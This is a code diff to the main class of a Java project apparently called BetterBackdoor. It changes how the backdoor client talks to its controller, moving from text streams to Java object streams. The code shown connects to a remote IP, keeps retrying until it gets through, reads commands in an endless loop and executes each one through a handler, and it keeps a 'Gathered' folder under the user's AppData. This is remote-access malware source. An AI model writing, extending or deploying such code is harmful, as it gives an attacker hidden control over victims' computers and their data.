@@ -1,7 +1,6 @@
 package com.thatcherdev.betterbackdoor.backdoor;
 
-import java.io.File;
-import java.io.PrintWriter;
+import java.io.*;
 import java.net.Socket;
 import java.util.Scanner;
 
@@ -9,13 +8,13 @@ public class Backdoor {
 
 	public static String ip;
 	private static Socket socket;
-	private static Scanner in;
-	public static PrintWriter out;
+	private static ObjectInputStream in;
+	public static ObjectOutputStream out;
 	public static String gatheredDir = System.getProperty("user.home") + "\\AppData\\Gathered\\";
 
 	/**
 	 * Constructs and starts a new Backdoor.
-	 * 
+	 *
 	 * @param args command line arguments
 	 */
 	public static void main(String[] args) {
@@ -57,10 +56,10 @@ public class Backdoor {
 				} catch (Exception e) {
 					Thread.sleep(3000);
 				}
-			in = new Scanner(socket.getInputStream());
-			out = new PrintWriter(socket.getOutputStream(), true);
+			out = new ObjectOutputStream(socket.getOutputStream());
+			in = new ObjectInputStream(socket.getInputStream());
 			while (true) {
-				String command = in.nextLine();
+				String command = (String) in.readObject();
 				HandleCommand.handle(command);
 			}
 		} catch (Exception e) {
@@ -81,7 +80,7 @@ public class Backdoor {
 	/**
 	 * Gets the contents of the file with the name {@code filename} from inside the
 	 * jar file this class will be running from.
-	 * 
+	 *
 	 * @param filename name of the file to get contents of
 	 * @return contents of the file
 	 */
